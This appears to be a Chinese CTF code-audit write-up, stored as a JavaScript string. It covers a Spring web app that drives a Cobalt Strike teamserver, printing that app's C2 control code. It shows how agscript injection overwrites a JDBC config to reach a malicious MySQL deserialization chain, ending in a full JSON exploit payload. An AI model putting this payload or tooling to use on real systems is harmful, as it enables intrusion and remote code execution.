const e=`# \u6587\u7AE0 - CS\u4EE3\u7801\u5BA1\u8BA1\u914D\u5408Jdbc\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u5229\u7528  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:51 AM
URL: https://xz.aliyun.com/news/15973
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

### CS\u4EE3\u7801\u5BA1\u8BA1\u5206\u6790\u4EFB\u610F\u6587\u4EF6\u8986\u76D6\u6F0F\u6D1E

\u8DEF\u7531\u4E3B\u8981\u4EE3\u7801\u5982\u4E0B\uFF0CIndexController.java

package org.example.ez_web.controller;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
@Controller
/* loaded from: IndexController.class */
public class IndexController {
@RequestMapping({"/"})
public String index() {
return "index";
}
@RequestMapping({"/RunCSByMySelf"})
public String RunCS(Model model) throws Exception {
String C2ip = new BufferedReader(new InputStreamReader(new ProcessBuilder("hostname", "-I").start().getInputStream())).readLine().split("\\\\s+")[0];
model.addAttribute("C2ip", String.join("\\n", C2ip));
if (new File("CSRun.sh").exists()) {
return "ip";
}
String content = "cd /tmp/CS;./teamserver " + C2ip + " 123456 &";
try {
BufferedWriter writer = new BufferedWriter(new FileWriter("CSRun.sh"));
writer.write(content);
if (writer != null) {
if (0 != 0) {
writer.close();
} else {
writer.close();
}
}
} catch (Exception e) {
e.printStackTrace();
}
new ProcessBuilder("chmod", "+x", "./CSRun.sh").start().waitFor();
new ProcessBuilder("./CSRun.sh").start();
return "ip";
}
}

\u8FD9\u6BB5\u5C31\u662F\u5199\u5165\u6587\u4EF6\u7136\u540E\u5728\u9776\u673A\u672C\u5730\u542F\u52A8\u811A\u672C\u8FD0\u884C\u4E86\u4E00\u4E2ACS

DatabaseConnect.java

package org.example.ez_web.utils;
import com.jayway.jsonpath.JsonPath;
import com.jayway.jsonpath.Predicate;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Properties;
import java.util.stream.Collectors;
/* loaded from: DatabaseConnect.class */
public class DatabaseConnect {
private String url;
private String ip;
private String port;
private String dbname;
private Connection connection;
public DatabaseConnect() throws Exception {
String json = (String) Files.lines(Paths.get("/tmp/config.json", new String[0])).collect(Collectors.joining(System.lineSeparator()));
this.ip = (String) JsonPath.read(json, "$.ip", new Predicate[0]);
this.port = (String) JsonPath.read(json, "$.port", new Predicate[0]);
this.dbname = (String) JsonPath.read(json, "$.dbname", new Predicate[0]);
this.url = "jdbc:mysql://" + this.ip + ":" + this.port + "/" + this.dbname;
}
public Connection connect() throws SQLException {
if (this.connection == null || this.connection.isClosed()) {
try {
Properties properties = new Properties();
properties.setProperty("allowLoadLocalInfile", "false");
properties.setProperty("allowUrlInLocalInfile", "false");
properties.setProperty("allowLoadLocalInfileInPath", "");
properties.setProperty("user", "root");
properties.setProperty("password", "root");
Class.forName("com.mysql.jdbc.Driver");
this.connection = DriverManager.getConnection(this.url, properties);
} catch (ClassNotFoundException e) {
throw new SQLException("MySQL \u9A71\u52A8\u52A0\u8F7D\u5931\u8D25", e);
}        }        return this.connection;
}}

jdbc\u6570\u636E\u5E93\u8FDE\u63A5\u7528\u7684\u662F\u53C2\u6570\u62FC\u63A5\u5982\u679C\u53EF\u63A7\u6587\u4EF6\u5185\u5BB9\u5C31\u4F1A\u5B58\u5728\u6F0F\u6D1E\uFF0C\u89E3\u91CA\u4E00\u4E0B\u5B57\u6BB5\u8BFB\u53D6\u7684\u65B9\u6CD5

- **\`JsonPath.read\` \u65B9\u6CD5**\uFF1A
    - \u8FD9\u662F JsonPath \u5E93\u63D0\u4F9B\u7684\u9759\u6001\u65B9\u6CD5\uFF0C\u7528\u4E8E\u4ECE JSON \u6587\u6863\u4E2D\u63D0\u53D6\u6570\u636E\u3002
    - \u7B2C\u4E00\u4E2A\u53C2\u6570\u662F JSON \u6587\u6863\uFF08\u901A\u5E38\u662F\u4E00\u4E2A \`String\` \u6216 \`JSONObject\` \u5BF9\u8C61\uFF09\u3002
    - \u7B2C\u4E8C\u4E2A\u53C2\u6570\u662F JsonPath \u8868\u8FBE\u5F0F\uFF0C\u7528\u4E8E\u6307\u5B9A\u8981\u63D0\u53D6\u7684\u5B57\u6BB5\u3002
    - \u7B2C\u4E09\u4E2A\u53C2\u6570\uFF08\`new Predicate[0]\`\uFF09\u662F\u53EF\u9009\u53C2\u6570\uFF0C\u901A\u5E38\u7528\u4E8E\u6DFB\u52A0\u8FC7\u6EE4\u6761\u4EF6\u3002
- **\u5B57\u6BB5\u63D0\u53D6**\uFF1A
    - **\`ScriptType\`**\uFF1A\u63D0\u53D6 JSON \u4E2D\u7684 \`$.type\` \u5B57\u6BB5\u3002
    - **\`CSIp\`**\uFF1A\u63D0\u53D6 JSON \u4E2D\u7684 \`$.data.ip\` \u5B57\u6BB5\u3002
    - **\`CSPort\`**\uFF1A\u63D0\u53D6 JSON \u4E2D\u7684 \`$.data.port\` \u5B57\u6BB5\u3002
    - **\`CSUserName\`**\uFF1A\u63D0\u53D6 JSON \u4E2D\u7684 \`$.data.username\` \u5B57\u6BB5\u3002
    - **\`CSPassWord\`**\uFF1A\u63D0\u53D6 JSON \u4E2D\u7684 \`$.data.password\` \u5B57\u6BB5\u3002
- **\u793A\u4F8B JSON**\uFF1A \u5047\u8BBE JSON \u6570\u636E\u5982\u4E0B\uFF1A

{
"type": "exampleType",
"data": {
"ip": "192.168.1.1",
"port": "8080",
"username": "admin",
"password": "123456"
}
}

check.java

package org.example.ez_web.utils;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewMethod;
/* loaded from: CheckClass.class */
public class CheckClass {
public CheckClass() throws Exception {
CtClass ctClass0 = ClassPool.getDefault().get("com.mysql.jdbc.ResultSetImpl");
ctClass0.removeMethod(ctClass0.getDeclaredMethod("getBytes"));
ctClass0.addMethod(CtNewMethod.make("public byte[] getBytes(int columnIndex) throws java.lang.Exception {\\n    byte[] data = this.getBytes(columnIndex, false);\\n    java.io.ByteArrayInputStream bytesIn = new java.io.ByteArrayInputStream(data);\\n    java.io.ObjectInputStream objIn = new org.example.ez_web.utils.NewObjectInputStream(bytesIn);\\n    objIn.readObject();\\n    return data;\\n}", ctClass0));
ctClass0.toClass();
}}

\u8FD9\u4E2A\u5DE5\u5177\u7C7B\u5B9E\u4F7F\u7528 \`CtNewMethod.make\` \u65B9\u6CD5\u5B9A\u4E49\u65B0\u7684\u65B9\u6CD5\u5E76\u6DFB\u52A0\u5230\u7C7B\u4E2D\uFF0C\u5E76\u4E14\u65B0\u5199\u5165\u7684\u65B9\u6CD5\u6709\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF0C
\u8BE5\u7C7B\u5728jdbc\u8FDB\u884Csql\u8BED\u53E5\u6267\u884C\u65F6\u5019\u4F1A\u89E6\u53D1\uFF0C\u800C\u6211\u4EEC\u7684doScript\u8DEF\u7531\u5C31\u4F1A\u6267\u884CSQL\u67E5\u8BE2

![](https://xzfile.aliyuncs.com/media/upload/picture/20241203235737-51849eae-b18f-1.png)

ConnectController.java

// Source code is decompiled from a .class file using FernFlower decompiler.
package org.example.ez_web.controller;
import com.jayway.jsonpath.JsonPath;
import com.jayway.jsonpath.Predicate;
import java.io.File;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.util.Scanner;
import org.example.ez_web.utils.DatabaseConnect;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
@Controller
@RequestMapping({"/connect"})
public class ConnectController {
static String AgScriptPath = "/tmp/CS";
static String ListenerType = "windows/beacon_http/reverse_http";
public ConnectController() {
}
@RequestMapping({"/index"})
public String index() {
return "connect/index";
}
@RequestMapping(
value = {"/doScript"},
method = {RequestMethod.POST}
)
public String doScript(@RequestBody String json, Model model) throws Exception {
String ScriptType = (String)JsonPath.read(json, "$.type", new Predicate[0]);
String CSIp = (String)JsonPath.read(json, "$.data.ip", new Predicate[0]);
String CSPort = (String)JsonPath.read(json, "$.data.port", new Predicate[0]);
String CSUserName = (String)JsonPath.read(json, "$.data.username", new Predicate[0]);
String CSPassWord = (String)JsonPath.read(json, "$.data.password", new Predicate[0]);
Process process = null;
String query = "INSERT INTO cs_Type (Type) VALUES (?)";
try {
Connection connect = (new DatabaseConnect()).connect();
Throwable var11 = null;
try {
PreparedStatement ps = connect.prepareStatement(query);
Throwable var13 = null;
try {
ps.setString(1, ScriptType);
ps.executeUpdate();
} catch (Throwable var63) {
var13 = var63;
throw var63;
} finally {
if (ps != null) {
if (var13 != null) {
try {
ps.close();
} catch (Throwable var62) {
var13.addSuppressed(var62);
}
} else {
ps.close();
}
}
}
} catch (Throwable var68) {
var11 = var68;
throw var68;
} finally {
if (connect != null) {
if (var11 != null) {
try {
connect.close();
} catch (Throwable var61) {
var11.addSuppressed(var61);
}
} else {
connect.close();
}
}
}
} catch (Exception var70) {
var70.printStackTrace();
}
String SocksPort;
String beaconid;
ProcessBuilder pb;
if (ScriptType.equals("&beacon_shell")) {
SocksPort = (String)JsonPath.read(json, "$.data.cmd", new Predicate[0]);
beaconid = (String)JsonPath.read(json, "$.data.beaconid", new Predicate[0]);
pb = new ProcessBuilder(new String[]{"python3", "/tmp/index.py", "beacon_shell", CSIp, CSPort, CSUserName, CSPassWord, AgScriptPath, beaconid, SocksPort});
pb.start();
} else if (ScriptType.equals("&create_http_listener")) {
SocksPort = (String)JsonPath.read(json, "$.data.ListenerIp", new Predicate[0]);
beaconid = (String)JsonPath.read(json, "$.data.ListenerName", new Predicate[0]);
String ListenerPort = (String)JsonPath.read(json, "$.data.ListenerPort", new Predicate[0]);
ProcessBuilder pb = new ProcessBuilder(new String[]{"python3", "/tmp/index.py", "create_http_listener", CSIp, CSPort, CSUserName, CSPassWord, AgScriptPath, beaconid, ListenerType, SocksPort, ListenerPort});
pb.start();
} else if (ScriptType.equals("&get_beacons")) {
ProcessBuilder pb = new ProcessBuilder(new String[]{"python3", "/tmp/index.py", "get_beacons", CSIp, CSPort, CSUserName, CSPassWord, AgScriptPath});
pb.start();
} else {
ProcessBuilder pb;
if (ScriptType.equals("&get_listener_info")) {
SocksPort = (String)JsonPath.read(json, "$.data.ListenerName", new Predicate[0]);
pb = new ProcessBuilder(new String[]{"python3", "/tmp/index.py", "get_listener_info", CSIp, CSPort, CSUserName, CSPassWord, AgScriptPath, SocksPort});
pb.start();
} else if (ScriptType.equals("&create_socks")) {
SocksPort = (String)JsonPath.read(json, "$.data.SocksPort", new Predicate[0]);
beaconid = (String)JsonPath.read(json, "$.data.beaconid", new Predicate[0]);
pb = new ProcessBuilder(new String[]{"python3", "/tmp/index.py", "create_socks", CSIp, CSPort, CSUserName, CSPassWord, AgScriptPath, beaconid, SocksPort});
pb.start();
} else {
SocksPort = (String)JsonPath.read(json, "$.data.ScriptContent", new Predicate[0]);
pb = new ProcessBuilder(new String[]{"python3", "/tmp/index.py", "run_script", CSIp, CSPort, CSUserName, CSPassWord, AgScriptPath, SocksPort});
pb.start();
}
}
StringBuilder content = new StringBuilder();
try {
Scanner scanner = new Scanner(new File("/tmp/result.txt"));
Throwable var78 = null;
try {
while(scanner.hasNextLine()) {
content.append(scanner.nextLine()).append("\\n");
}
} catch (Throwable var64) {
var78 = var64;
throw var64;
} finally {
if (scanner != null) {
if (var78 != null) {
try {
scanner.close();
} catch (Throwable var60) {
var78.addSuppressed(var60);
}
} else {
scanner.close();
}
}
}
} catch (Exception var66) {
var66.printStackTrace();
}
beaconid = String.join("\\n", content.toString());
model.addAttribute("pythonOutput", beaconid);
return "connect/output";
}
}

\u901A\u8FC7\u8BFB\u6587\u4EF6\u5F97\u5230\u5BF9\u5E94\u53C2\u6570\u540E\u4F1A\u8FD0\u884Cindex.py\u6587\u4EF6\uFF0C\u6211\u4EEC\u8DDF\u8FDB\u53BB\u770B\u4E00\u4E0B

![](https://xzfile.aliyuncs.com/media/upload/picture/20241203235807-63815386-b18f-1.png)

index.py

import sys
from script.striker import CSConnector
command_type = sys.argv[1]
with CSConnector(
cs_host=sys.argv[2],
cs_port=sys.argv[3],
cs_user=sys.argv[4],
cs_pass=sys.argv[5],
cs_directory=sys.argv[6]) as cs:
output = ""
if(command_type == "beacon_shell"):
beaconid = sys.argv[7]
CSCmd = sys.argv[8]
output = cs.beacon_shell(beaconid,CSCmd)
elif(command_type == "create_http_listener"):
ListenerName = sys.argv[7]
ListenerType = sys.argv[8] #\u540E\u9762\u56FA\u5B9A\u4E86\uFF0C\u61D2\u5F97\u6539\u4E86
ListenerIp = sys.argv[9]
ListenerPort = sys.argv[10]
output = cs.create_http_listener(ListenerName,ListenerIp,ListenerPort,ListenerIp)
elif(command_type == "get_beacons"):
output = cs.get_beacons()
elif(command_type == "get_listener_info"):
ListenerName = sys.argv[7]
output = cs.get_listener_info(ListenerName)
elif(command_type == "create_socks"):
beaconid = sys.argv[7]
SocksPort = sys.argv[8]
output = cs.create_socks(beaconid, SocksPort)
else:
ScriptContent = sys.argv[7]
output = cs.run_script(ScriptContent)
with open("/tmp/result.txt","w") as file:
file.write(str(output))
file.close()

\u83B7\u53D6\u547D\u4EE4\u4F20\u5165\u7684\u53C2\u6570\uFF0C\u521B\u5EFAcs\u5B9E\u4F8B\uFF0C\u6309\u7167\u6E90\u7801\u683C\u5F0F\u586B\u5199\u8868\u5355\uFF0C\u5373\u53EF\u53D1\u9001\u5BF9\u5E94\u6570\u636E\u3002\u4EFB\u4F55\u4E00\u4E2A\u670D\u52A1\u5668\u7684teamserver\u670D\u52A1\u90FD\u662F\u53EF\u4EE5\u88AB\u9776\u673A\u8FDE\u63A5\u7684\uFF0C\u6267\u884C\u5BF9\u5E94type\u7684\u547D\u4EE4\u53EF\u4EE5\u62FF\u5230teamserver\u76F8\u5E94\u7684\u7ED3\u679C

\u63A5\u7740\u6211\u4EEC\u67E5\u770BCSConnector\u8BE5\u7C7B\u7684\u6E90\u7801

import pexpect
import getpass
from os import path
from os.path import abspath
from re import findall, escape, MULTILINE
import base64
from time import sleep
from collections import defaultdict
from script.sleepy import wrap_command, deserialize, convert_to_oneline
from enum import Enum
class ArtifactType(Enum):
DLL = "dll"
EXE = "exe"
POWERSHELL = "powershell"
PYTHON = "python"
RAW = "raw"
SVCEXE = "svcexe"
VBSCRIPT = "vbscript"
class CSConnector:
def __init__(self, cs_host, cs_user=None, cs_pass=None, cs_directory="./", cs_port=50050):
self.cs_host = cs_host
if not cs_user or not cs_pass or not cs_port:
agproperties = self.parse_aggressor_properties()
if cs_host in agproperties:
cs_user = agproperties[cs_host]["user"]
cs_port = agproperties[cs_host]["port"]
cs_pass = agproperties[cs_host]["password"]
self.cs_user = cs_user + "_striker"
if not cs_pass:
self.cs_pass = getpass.getpass("Enter Cobalt Strike password: ")
else:
self.cs_pass = cs_pass
self.cs_port = cs_port
self.cs_directory = cs_directory
self.aggscriptcmd = "'{}/agscript'".format(self.cs_directory)
self.cs_process = None
def __enter__(self) -> 'CSConnector':
self.connectTeamserver()
return self
def __exit__(self, type, value, tb):
self.disconnectTeamserver()
def generateMSBuild(
self,
agscriptPath: str,
listener: str,
outputPath: str = './',
staged: bool = False,
x64: bool = True
):
shellcode = self.generateShellcode(listener, staged=staged, x64=x64)
if shellcode:
encoded = base64.b64encode(shellcode)
if x64:
arch = "64"
else:
arch = "32"
if staged:
filename = 'staged'
else:
filename = 'stageless'
templateFile = f'Helpers/msBuild/artifact_{arch}.xml'
templatePath = path.join(agscriptPath, templateFile)
filename = path.join(outputPath, f'{filename}_{arch}.xml')
with open(templatePath, 'rt') as read_file:
data = read_file.read()
data = data.replace('%%DATA%%', encoded.decode())
with open(filename, 'wt') as write_file:
write_file.write(data)
def generateShellcode(self, listener: str,  staged: bool = False, x64: bool = True) -> bytes:
return self.generatePayload(listener, ArtifactType.RAW, staged=staged, x64=x64)
def generatePayload(
self,
listener: str,
artifact_type: 'ArtifactType',
staged: bool = False,
x64: bool = True,
exit: str = '',
callmethod : str = ''
) -> bytes:
if x64:
arch = "x64"
else:
arch = "x86"
if staged:
function = "artifact_stager"
cmd = f"return base64_encode(artifact_stager('{listener}', '{artifact_type.value}', '{arch}'))"
else:
if len(callmethod) > 0 and len(exit) > 0:
cmd = f"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}', '{exit}', '{callmethod}'))"
else:
cmd = f"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}'))"
encoded_bytes = self.ag_get_object(cmd, timeout=30000)
return base64.b64decode(encoded_bytes)
def hostFile(
self,
file_path: str,
site: str = None,
port: int = 80,
uri: str = '/hosted.txt',
mime_type: str = 'text/plain',
description: str = 'Autohosted File',
use_ssl: bool = False,
sleep_time: int = 2
) -> str:
if not site:
site = self.get_local_ip()
if site:
site = f"\\"{site}\\""
else:
site = "localip()"
else:
site="\\"{}\\"".format(site)
sites = self.get_sites()
for a_site in sites:
site_type = a_site.get('Type')
if site_type == 'page':
site_host = a_site.get('Host')
if f"\\"{site_host}\\"" == site:
site_uri = a_site.get('URI')
if site_uri == uri:
self.killHostedFile(port=port, uri=uri)
if use_ssl:
link = "https://{}:{}{}".format(site.strip('\\"'), port, uri)
else:
link = "http://{}:{}{}".format(site.strip('\\"'), port, uri)
if use_ssl:
use_ssl = "true"
else:
use_ssl = "false"
if file_path[0] != '/':
file_path = abspath(file_path)
file_path = f"'{file_path}'"
multiline = f"""
$handle = openf({file_path});
$content = readb($handle, -1);
closef($handle);
site_host({site}, {port}, "{uri}", $content, "{mime_type}", "{description}", {use_ssl});
"""
self.ag_sendline_multiline(multiline, sleep_time=sleep_time)
return link
def get_local_ip(self) -> str:
command = "return localip()"
return self.ag_get_object(command)
def get_listener_info(self,name) -> list:
command = f'return listener_info("{name}")'
return self.ag_get_object(command)
def get_beacons(self) -> list:
command = "return beacons()"
return self.ag_get_object(command)
def create_http_listener(self,name,ip,port,return_ip) -> list:
command = f'listener_create("{str(name)}", "windows/beacon_http/reverse_http","{str(ip)}","{str(port)}","{str(return_ip)}")'
return self.ag_get_object(command)
def beacon_shell(self,id,cmd) -> list:
command = f'bshell("{id}", "{cmd}")'
return self.ag_get_object(command)
def get_listener_test_info(self,name) -> list:
command = f'listener_info("{name}")'
return self.ag_get_object(command)
def create_socks(self,id,port) -> list:
command = f'return bsocks("{str(id)}","{str(port)}")'
return self.ag_get_object(command)
def run_script(self,script_content):
command = f"{str(script_content)}"
return self.ag_get_object(command)
def connectTeamserver(self):
if not path.exists("{}{}".format(self.cs_directory, "/cobaltstrike.jar")):
raise Exception("Error: Cobalt Strike JAR file not found")
command = "{} {} {} {} {}".format(self.aggscriptcmd,
self.cs_host,
self.cs_port,
self.cs_user,
self.cs_pass)
self.cs_process = pexpect.spawn("{} {} {} {} {}".format(self.aggscriptcmd,
self.cs_host,
self.cs_port,
self.cs_user,
self.cs_pass), cwd=self.cs_directory)
if not self.cs_process.isalive():
raise Exception("Error connecting to CS team server! Check config and try again.")
try:
self.cs_process.expect(r'\\x1b\\[4maggressor\\x1b\\[0m>', timeout=5)
self.send_ready_command()
except (pexpect.exceptions.TIMEOUT, pexpect.exceptions.EOF):
print(self.cs_process.before.decode())
raise Exception("EOF encountered") from None
def send_ready_command(self):
cmd = 'on ready { println("Successfully" . " connected to teamserver!"); }'
expect = '.*Successfully connected to teamserver!.*'
self.ag_get_string(cmd, expect=expect)
def disconnectTeamserver(self):
if self.cs_process:
self.cs_process.close()
else:
print("CS was already disconnected! Hopefully you already knew this.")
def ag_sendline(self, cmd, script_console_command='e', sleep_time: int = 0):
if '' == cmd:
full_cmd = "{}".format(script_console_command)
else:
full_cmd = "{} {}".format(script_console_command, cmd)
self.cs_process.sendline(full_cmd)
sleep(sleep_time)
return full_cmd
def ag_sendline_multiline(self, multiline: str, script_console_command: str = 'e', sleep_time: int = 0):
oneline = convert_to_oneline(multiline)
return self.ag_sendline(oneline, script_console_command=script_console_command, sleep_time=sleep_time)
def ag_get_string_multiline(self, multiline: str, script_console_command: str = 'e', expect: str = r'\\r\\n\\x1b\\[4maggressor\\x1b\\[0m>', timeout: int = -1, sleep_time: int = 0) -> str:
oneline = convert_to_oneline(multiline)
return self.ag_get_string(oneline, script_console_command=script_console_command, expect=expect, timeout=timeout, sleep_time=sleep_time)
def ag_get_string(self, cmd: str, script_console_command: str = 'e', expect: str = r'\\r\\n\\x1b\\[4maggressor\\x1b\\[0m>', timeout: int = -1, sleep_time: int = 0) -> str:
full_cmd = self.ag_sendline(cmd, script_console_command=script_console_command, sleep_time=sleep_time)
self.cs_process.expect(escape(full_cmd), timeout=timeout)
self.cs_process.expect(expect, timeout=timeout)
before = self.cs_process.before.decode()
return before
def ag_get_object_multiline(self, multiline: str, script_console_command: str = 'e', expect: str = r'\\r\\n\\x1b\\[4maggressor\\x1b\\[0m>', timeout: int = -1, sleep_time: int = 0):
oneline = convert_to_oneline(multiline)
return self.ag_get_object(oneline, script_console_command=script_console_command, expect=expect, timeout=timeout, sleep_time=sleep_time)
def ag_get_object(self, cmd: str, script_console_command: str = 'e', expect: str = r'\\r\\n\\x1b\\[4maggressor\\x1b\\[0m>', timeout: int = -1, sleep_time: int = 0) -> str:
wrapped = wrap_command(cmd)
match = self.ag_get_string(wrapped, script_console_command=script_console_command, expect=expect, timeout=timeout, sleep_time=sleep_time)
base64_regex = r"^(?:[A-Za-z0-9+\\/]{4})*(?:[A-Za-z0-9+\\/]{2}==|[A-Za-z0-9+\\/]{3}=|[A-Za-z0-9+\\/]{4})$"
parse = findall(base64_regex, match, MULTILINE)
if parse:
return deserialize(parse[0])
else:
raise Exception(f"Base64 regex found no match on {match[:50]}") from None
def parse_aggressor_properties(self, aggprop=None):
connections = defaultdict(dict)
if not aggprop:
homedir = path.expanduser("~")
aggprop= f"{homedir}/.aggressor.prop"
with open(aggprop, "r") as file:
for line in file.readlines():
if "connection.profiles." in line:
regexes = [
r"connection\\.profiles\\.(.*?)\\.user=(.*)",
r"connection\\.profiles\\.(.*?)\\.password=(.*)",
r"connection\\.profiles\\.(.*?)\\.port=(.*)"
]
keys = [
"user",
"password",
"port"
]
for regex, key in zip(regexes, keys):
matches = findall(regex, line)
if matches:
match = matches[0]
ip, value = match
connection = connections[ip]
connection[key] = value
return connections
def parseArguments():
parser = ArgumentParser()
parser.add_argument("-t", "--teamserver", help="the hostname or IP address of the teamserver", required=True)
parser.add_argument("-u", "--user", help="the user to connect to the teamserver as (_striker will be added)", default=environ.get('USER'))
# TODO: Make this requirement optional and if not provided, secure prompt for password
parser.add_argument("-p", "--password", help="the password for the teamserver, if not provided, you will be prompted", default=None)
parser.add_argument("-P", "--port", help="the port for the teamserver, default is 50050", default=50050)
parser.add_argument("-j", "--javadir", help="the path to the directory containing the Cobalt Strike JAR file", default="./")
args = parser.parse_args()
return args
def main():
args = parseArguments()
with CSConnector(
args.teamserver,
cs_user=args.user,
cs_pass=args.password,
cs_directory=args.javadir,
cs_port=args.port
) as cs:
pass
if __name__ == '__main__':
from argparse import ArgumentParser
from os import environ
main()

\u7ECF\u8FC7\u6E90\u7801\u5206\u6790\u6216\u8005\u9879\u76EEreadme\u53EF\u4EE5\u5F97\u77E5\u6B64\u9879\u76EE\u662F\u8C03\u7528\u7684cs\u7684agscript\u6765\u63A7\u5236CS\u670D\u52A1\u7AEF

![](https://xzfile.aliyuncs.com/media/upload/picture/20241203235656-38be1a1c-b18f-1.png)

\u63A5\u7740\u8DDF\u8E2A\u53D1\u73B0\u6267\u884C\u7684agscript\u811A\u672C\uFF0C\u6BD4\u5982beacon_shell\u5229\u7528beaconid\u6307\u5B9Abeacon\u6267\u884C\u76F8\u5E94\u547D\u4EE4agscript

![](https://xzfile.aliyuncs.com/media/upload/picture/20241203235648-341e4a68-b18f-1.png)

CS\u5B98\u65B9\u6587\u6863\u53EF\u4EE5\u53C2\u8003 \u6587\u6863\u5730\u5740\uFF1A[Functions](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm)

\u53EA\u8981\u6211\u4EEC\u53EF\u4EE5\u63A7\u5236command\u8FD9\u4E2A\u53C2\u6570\u7684\u503C\uFF0C\u6211\u4EEC\u5C31\u53EF\u4EE5\u6267\u884C\u4EFB\u610Fagscript\u811A\u672C\u4EE3\u7801\uFF0C\u56DE\u5230index.py\u786E\u5B9E\u53D1\u73B0\u53C2\u6570\u53EF\u63A7

with CSConnector(
cs_host=sys.argv[2],
cs_port=sys.argv[3],
cs_user=sys.argv[4],
cs_pass=sys.argv[5],
cs_directory=sys.argv[6]) as cs:
output = ""
if(command_type == "beacon_shell"):
beaconid = sys.argv[7]
CSCmd = sys.argv[8]
output = cs.beacon_shell(beaconid,CSCmd)
elif(command_type == "create_http_listener"):
ListenerName = sys.argv[7]
ListenerType = sys.argv[8] #\u540E\u9762\u56FA\u5B9A\u4E86\uFF0C\u61D2\u5F97\u6539\u4E86
ListenerIp = sys.argv[9]
ListenerPort = sys.argv[10]
output = cs.create_http_listener(ListenerName,ListenerIp,ListenerPort,ListenerIp)
elif(command_type == "get_beacons"):
output = cs.get_beacons()
elif(command_type == "get_listener_info"):
ListenerName = sys.argv[7]
output = cs.get_listener_info(ListenerName)
elif(command_type == "create_socks"):
beaconid = sys.argv[7]
SocksPort = sys.argv[8]
output = cs.create_socks(beaconid, SocksPort)
else:
ScriptContent = sys.argv[7]
output = cs.run_script(ScriptContent)
with open("/tmp/result.txt","w") as file:
file.write(str(output))
file.close()

\u8DDF\u8E2A\u5230run_script\u65B9\u6CD5\u53D1\u73B0\u5C31\u662F\u53EF\u63A7\u7684\u811A\u672C\u5185\u5BB9

def run_script(self,script_content):
command = f"{str(script_content)}"
return self.ag_get_object(command)

\u6211\u4EEC\u9605\u8BFB\u6587\u6863\u7684[Functions](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#artifact)\u7BC7\u7AE0\uFF0C\u53EF\u4EE5\u53D1\u73B0cs\u662F\u53EF\u4EE5\u5229\u7528agscript\u811A\u672C\u8FDB\u884C\u6728\u9A6C\u751F\u6210\u7684\uFF0C \u6BD4\u5982\uFF1A

$data = artifact("my listener", "exe");
$handle = openf(">out.exe");
writeb($handle, $data);
closef($handle);

\u800C\u6211\u4EEC\u53EA\u8981\u628A\u6587\u4EF6\u540D\u548Cdata\u503C\u6539\u6210\u81EA\u5B9A\u4E49\u503C\u5C31\u53EF\u4EE5\u9020\u6210\u4E00\u4E2A\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\uFF0C\u800C\u6211\u4EEC\u4E4B\u524D\u770B\u5230jdbc\u8FDE\u63A5\u662F\u901A\u8FC7\u8BFB\u6587\u4EF6\u83B7\u53D6\u7684\u53C2\u6570\u62FC\u63A5\uFF0C\u90A3\u4E48\u6211\u4EEC\u4FBF\u53EF\u4EE5\u5229\u7528\u6B64\u6F0F\u6D1E\u5199\u5165\`/tmp/config.json\`\u6587\u4EF6\uFF0C\u5B8C\u5168\u63A7\u5236url\u5B57\u6BB5\u3002

### Jdbc\u53CD\u5E8F\u5217\u5316\u914D\u5408jackson\u7684\u4E8C\u6B21\u53CD\u5E8F\u5217\u5316\u94FE

\u63A5\u4E0B\u6765\u5C31\u53EF\u4EE5\u91CC\u6253jdbc\u7684\u53CD\u5E8F\u5217\u5316\uFF0Ccheckclass\u4E2D\u5BF9mysql\u7C7B\u7684getBytes\u505A\u4E86\u4E00\u4E0Bwaf\uFF0C\u5176\u5B9E\u5C31\u662F\u53D8\u76F8\u7684\u7ED9\u53CD\u5E8F\u5217\u5316ban\u4E86\u4FE9\u7C7B\uFF0C\u9700\u8981\u6253\u4E8C\u6B21\u53CD\u5E8F\u5217\u5316\u7ED5\u8FC7\u3002

\u770B\u4E00\u4E0Bmaven\u4F9D\u8D56\u53D1\u73B0\u53EF\u4EE5\u6253jackson\u4E8C\u6B21\u53CD\u5E8F\u5217\u5316

![](https://xzfile.aliyuncs.com/media/upload/picture/20241203235548-104520f8-b18f-1.png)

### \u6574\u4F53\u601D\u8DEF\u5982\u4E0B\uFF1A

agscript\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u8986\u76D6/tmp/config.json =>
\u81EA\u5B9A\u4E49config\u5185\u5BB9\u89E6\u53D1jdbc\u53CD\u5E8F\u5217\u5316 =>
\u81EA\u5B9A\u4E49\u6076\u610Fmysql\u670D\u52A1\u5668\u6253jackson\u7684\u4E8C\u6B21\u53CD\u5E8F\u5217\u5316\u94FE

agscript\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u8986\u76D6/tmp/config.json \u7684payload\u5982\u4E0B

{
"type": "&123",
"data": {
"ip": "127.0.0.1",
"port": "50050",
"username": "aaa",
"password": "123456",
"ListenerName": "test",
"ScriptContent": "$data = \\"{'ip':'ip','port':'3306','dbname':'test?maxAllowedPacket=655360&allowUrlInLocalInfile=true&detectCustomCollations=true&autoDeserialize=true'}\\";$handle = openf(\\">/tmp/config.json\\");writeb($handle,$data);closef($handle);"
}
}

